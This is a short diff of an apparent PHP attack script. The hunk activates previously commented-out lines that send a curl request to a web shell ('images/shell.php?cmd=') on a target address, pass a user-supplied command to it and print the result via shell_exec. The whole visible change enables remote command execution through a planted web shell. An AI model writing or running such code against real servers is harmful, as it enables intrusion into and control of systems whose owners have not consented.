@@ -120,9 +120,9 @@ if(curl_errno($curl)){
 
 // Run shell command
 
-// $cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
-// $shellcmd = $argv[4];
+$cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
+$shellcmd = $argv[4];
 
-// echo shell_exec ($cmd.$shellcmd);
+echo shell_exec ($cmd.$shellcmd);
 
 curl_close($curl);
